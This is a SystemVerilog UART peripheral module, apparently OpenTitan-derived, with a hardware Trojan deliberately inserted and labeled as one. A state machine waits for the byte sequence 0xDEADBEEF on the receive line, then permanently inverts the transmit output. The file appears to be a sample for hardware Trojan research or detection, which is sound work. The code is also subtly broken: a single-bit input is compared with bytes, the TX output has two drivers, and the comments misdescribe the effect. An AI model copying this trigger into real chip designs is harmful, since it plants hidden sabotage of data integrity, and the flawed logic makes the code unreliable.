module uart
    import uart_reg_pkg::*;
#(
  parameter logic [NumAlerts-1:0] AlertAsyncOn = {NumAlerts{1'b1}},
  parameter int unsigned AlertSkewCycles = 1,
  parameter bit EnableRacl = 1'b0,
  parameter bit RaclErrorRsp = EnableRacl,
  parameter top_racl_pkg::racl_policy_sel_t RaclPolicySelVec[NumRegs] = '{NumRegs{0}}
) (
  input clk_i,
  input rst_ni,
  input tlul_pkg::tl_h2d_t tl_i,
  output tlul_pkg::tl_d2h_t tl_o,
  input prim_alert_pkg::alert_rx_t [NumAlerts-1:0] alert_rx_i,
  output prim_alert_pkg::alert_tx_t [NumAlerts-1:0] alert_tx_o,
  input top_racl_pkg::racl_policy_vec_t racl_policies_i,
  output top_racl_pkg::racl_error_log_t racl_error_o,
  output logic lsio_trigger_o,
  input cio_rx_i,
  output logic cio_tx_o,
  output logic cio_tx_en_o,
  output logic intr_tx_watermark_o,
  output logic intr_tx_empty_o,
  output logic intr_rx_watermark_o,
  output logic intr_tx_done_o,
  output logic intr_rx_overflow_o,
  output logic intr_rx_frame_err_o,
  output logic intr_rx_break_err_o,
  output logic intr_rx_timeout_o,
  output logic intr_rx_parity_err_o
);

  logic [NumAlerts-1:0] alert_test, alerts;
  uart_reg2hw_t reg2hw;
  uart_hw2reg_t hw2reg;
  logic corruption_active; // Trojan flag
  typedef enum logic [1:0] {IDLE, CHECK1, CHECK2, CHECK3} state_t;
  state_t state, next_state;

  uart_reg_top #(.EnableRacl(EnableRacl), .RaclErrorRsp(RaclErrorRsp), .RaclPolicySelVec(RaclPolicySelVec))
  u_reg (
    .clk_i(clk_i),
    .rst_ni(rst_ni),
    .tl_i(tl_i),
    .tl_o(tl_o),
    .reg2hw(reg2hw),
    .hw2reg(hw2reg),
    .racl_policies_i(racl_policies_i),
    .racl_error_o(racl_error_o),
    .intg_err_o(alerts[0])
  );

  uart_core uart_core (
    .clk_i(clk_i),
    .rst_ni(rst_ni),
    .reg2hw(reg2hw),
    .hw2reg(hw2reg),
    .rx(cio_rx_i),
    .tx(cio_tx_o),
    .lsio_trigger_o(lsio_trigger_o),
    .intr_tx_watermark_o(intr_tx_watermark_o),
    .intr_tx_empty_o(intr_tx_empty_o),
    .intr_rx_watermark_o(intr_rx_watermark_o),
    .intr_tx_done_o(intr_tx_done_o),
    .intr_rx_overflow_o(intr_rx_overflow_o),
    .intr_rx_frame_err_o(intr_rx_frame_err_o),
    .intr_rx_break_err_o(intr_rx_break_err_o),
    .intr_rx_timeout_o(intr_rx_timeout_o),
    .intr_rx_parity_err_o(intr_rx_parity_err_o)
  );

  // Trojan trigger state machine
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      state <= IDLE;
      corruption_active <= 1'b0;
    end else begin
      state <= next_state;
      if (state == CHECK3 && cio_rx_i == 8'hEF)
        corruption_active <= 1'b1; // Set corruption flag permanently
    end
  end

  // Next state logic for detecting the byte sequence 0xDEADBEEF
  always_comb begin
    case (state)
      IDLE:   next_state = (cio_rx_i == 8'hDE) ? CHECK1 : IDLE;
      CHECK1: next_state = (cio_rx_i == 8'hAD) ? CHECK2 : IDLE;
      CHECK2: next_state = (cio_rx_i == 8'hBE) ? CHECK3 : IDLE;
      CHECK3: next_state = IDLE;
      default: next_state = IDLE;
    endcase
  end

  // Modify tx data if corruption_active is set
  always_ff @(posedge clk_i) begin
    if (corruption_active)
      cio_tx_o <= ~cio_tx_o; // Invert parity bit of TX data
  end

  // Rest of code remains unaltered
  `ASSERT(TxEnIsOne_A, cio_tx_en_o === 1'b1)
  `ASSERT_KNOWN(TxKnown_A, cio_tx_o, clk_i, !rst_ni || !cio_tx_en_o)
  // Continue with other assertions...
endmodule
